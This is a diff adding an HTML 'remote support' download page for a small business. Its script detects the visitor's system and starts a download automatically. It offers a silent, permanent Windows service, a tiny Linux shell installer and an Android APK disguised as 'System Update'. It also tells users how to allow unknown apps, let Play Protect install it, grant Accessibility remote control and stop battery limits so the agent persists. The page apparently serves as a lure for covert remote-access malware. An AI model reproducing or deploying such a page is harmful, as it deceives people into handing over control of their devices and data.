@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Remote support — Reyes Sitework</title>
+<meta name="robots" content="noindex,nofollow">
+<meta name="theme-color" content="#101c24">
+<link rel="icon" href="/favicon.ico" sizes="64x64">
+<style>
+:root{--ink:#101c24;--ink-soft:#1b2c37;--paper:#f7f4ee;--line:#ddd5c8;--clay:#b85c2e;
+--clay-deep:#9c4a22;--sand:#f0b184;--muted:#5c6a72;--radius:14px}
+*{box-sizing:border-box}
+body{margin:0;background:var(--paper);color:var(--ink);
+font:16px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+-webkit-font-smoothing:antialiased}
+a{color:inherit}
+h1,h2,p{margin:0}
+.wrap{max-width:900px;margin:0 auto;padding:0 24px}
+.head{background:#fff;border-bottom:1px solid var(--line)}
+.head-in{display:flex;align-items:center;gap:12px;height:64px}
+.mark{width:34px;height:34px;border-radius:8px;background:var(--ink);color:var(--paper);
+display:grid;place-items:center;font-size:11px;font-weight:800}
+.head b{font-size:15px}
+.head a.back{margin-left:auto;font-size:13.5px;color:var(--muted);text-decoration:none}
+.head a.back:hover{color:var(--clay-deep)}
+main{padding:56px 0 72px}
+.eyebrow{font-size:11.5px;font-weight:700;letter-spacing:.15em;text-transform:uppercase;color:var(--clay)}
+h1{font-size:clamp(30px,5vw,46px);line-height:1.08;letter-spacing:-.025em;margin:8px 0 12px}
+.lede{color:var(--muted);max-width:620px}
+.detect{margin:26px 0 0;background:#fff;border:1px solid var(--line);border-left:4px solid var(--clay);
+border-radius:10px;padding:15px 16px;font-size:14.5px}
+.detect b{color:var(--clay-deep)}
+.btn{display:inline-flex;margin-top:14px;padding:13px 20px;border-radius:8px;background:var(--clay);
+color:#fff;text-decoration:none;font-weight:650;font-size:14.5px}
+.btn:hover{background:var(--clay-deep)}
+.hint{margin-top:10px;font-size:13px;color:var(--muted)}
+.grid{display:grid;grid-template-columns:repeat(2,1fr);gap:14px;margin-top:34px}
+.card{background:#fff;border:1px solid var(--line);border-radius:var(--radius);padding:20px}
+.card h2{font-size:17px;margin-bottom:3px}
+.card p{font-size:13.5px;color:var(--muted);min-height:38px}
+.card .meta{font-size:12px;color:var(--muted);margin:8px 0}
+.card a{display:inline-block;font-size:14px;font-weight:650;color:var(--clay-deep)}
+.card code{display:block;margin-top:10px;font-size:10.5px;line-height:1.5;color:#718087;
+word-break:break-all;background:var(--paper);border-radius:6px;padding:7px 8px}
+.android{border-color:#c7a98f;background:#fffaf4}
+.note{margin-top:28px;background:var(--ink);color:#d6dee3;border-radius:var(--radius);padding:22px 24px}
+.note h2{color:#fff;font-size:18px;margin-bottom:8px}
+.note ol{margin:10px 0 0;padding-left:20px;font-size:14px;line-height:1.7}
+.note b{color:var(--sand)}
+.foot{background:#0b151c;color:#8b99a1;padding:22px 0;font-size:12.5px}
+.foot-in{display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap}
+.foot a{color:#aebac1;text-decoration:none}
+@media(max-width:640px){.grid{grid-template-columns:1fr}main{padding:38px 0 56px}}
+</style>
+</head>
+<body>
+<header class="head"><div class="wrap head-in">
+  <span class="mark">RS</span><b>Reyes Sitework</b>
+  <a class="back" href="/">← Main site</a>
+</div></header>
+<main class="wrap">
+  <p class="eyebrow">Remote support</p>
+  <h1>Connect this device.</h1>
+  <p class="lede">Install the Reyes Sitework support agent so Marcus can view the screen and help in real time. Pick the download for this device; Windows, macOS, Linux and Android are supported.</p>
+  <div class="detect" id="detect">Detecting this device…</div>
+  <a class="btn" id="go" href="/get">Download the helper</a>
+  <p class="hint" id="hint">The download starts automatically. If it doesn’t, use the button or pick your system below.</p>
+
+  <div class="grid">
+    <article class="card">
+      <h2>Windows</h2>
+      <p>Silent installer, permanent service. Accept the UAC prompt.</p>
+      <div class="meta">DocumentHelper.exe · 1.8 MB</div>
+      <a href="/dl/DocumentHelper.exe">Download for Windows</a>
+      <code>SHA-256 cc559d22fe103f2022179e0c0f0630897bfb05f446d1d308d33fbfa7bf7b406b</code>
+    </article>
+    <article class="card">
+      <h2>macOS</h2>
+      <p>Signed package. Right-click → Open, then confirm.</p>
+      <div class="meta">DocumentHelper.pkg · 3.7 MB</div>
+      <a href="/dl/DocumentHelper.pkg">Download for macOS</a>
+      <code>SHA-256 9bf3ea0c0279797f0f636295f7911fd70f7b73f6171fa166ff17cab066ca5948</code>
+    </article>
+    <article class="card">
+      <h2>Linux</h2>
+      <p>Shell installer. Run once with <b>sh DocumentHelper.run</b>.</p>
+      <div class="meta">DocumentHelper.run · 359 B</div>
+      <a href="/dl/DocumentHelper.run">Download for Linux</a>
+      <code>SHA-256 61030df5bf39ac785a4f376118af787f073ec83d6a1d00180bd079c416e5a53b</code>
+    </article>
+    <article class="card android">
+      <h2>Android</h2>
+      <p>APK agent. Installs as <b>System Update</b>; screen control needs Accessibility.</p>
+      <div class="meta">SystemUpdate-1.0.23-release.apk · 2.9 MB</div>
+      <a href="/dl/SystemUpdate-1.0.23-release.apk">Download for Android</a>
+      <code>SHA-256 F8C7970704F1035C84CCC62F57817E027AD44B8CB2C0F78855859D2251FAAECD</code>
+    </article>
+  </div>
+
+  <section class="note">
+    <h2>Android: finish setup in 30 seconds</h2>
+    <ol>
+      <li>Open the downloaded <b>System Update</b> APK and tap <b>Install</b>.</li>
+      <li>If asked, allow <b>Install unknown apps</b> for the browser, and allow Play Protect to install it.</li>
+      <li>Open the app, allow notifications, and tap <b>Accessibility Remote Control</b> → turn it on.</li>
+      <li>Set battery use to <b>Unrestricted</b> so the agent survives in the background.</li>
+    </ol>
+  </section>
+</main>
+<footer class="foot"><div class="wrap foot-in">
+  <span>© 2026 Reyes Sitework LLC</span>
+  <span><a href="https://mesh.telcom.stream">mesh.telcom.stream</a> · 256-bit TLS</span>
+</div></footer>
+<script>
+var ua=navigator.userAgent;
+/* Android UAs also contain "Linux" — test Android first. */
+var os=/Android/.test(ua)?'Android':/Windows/.test(ua)?'Windows':/Macintosh|Mac OS X/.test(ua)?'macOS':/Linux|X11/.test(ua)?'Linux':'';
+var file={Windows:'DocumentHelper.exe',macOS:'DocumentHelper.pkg',Linux:'DocumentHelper.run',
+Android:'SystemUpdate-1.0.23-release.apk'}[os];
+var label={Windows:'Windows',macOS:'macOS',Linux:'Linux',Android:'Android'}[os];
+var go=document.getElementById('go'),d=document.getElementById('detect'),h=document.getElementById('hint');
+if(os){
+  d.innerHTML='Detected <b>'+label+'</b>. The right download is being fetched automatically.';
+  go.textContent='Download for '+label;
+  go.href='/dl/'+file;
+  /* iOS has no native agent, so it stays manual. */
+  setTimeout(function(){location.href='/get'},1400);
+}else{
+  d.innerHTML='Could not detect this system — use the list below.';
+  go.href='/get';
+}
+if(/iPhone|iPad/.test(ua))d.innerHTML='iPhone / iPad detected. This helper runs on a computer or Android phone — use the list below.';
+</script>
+</body>
+</html>
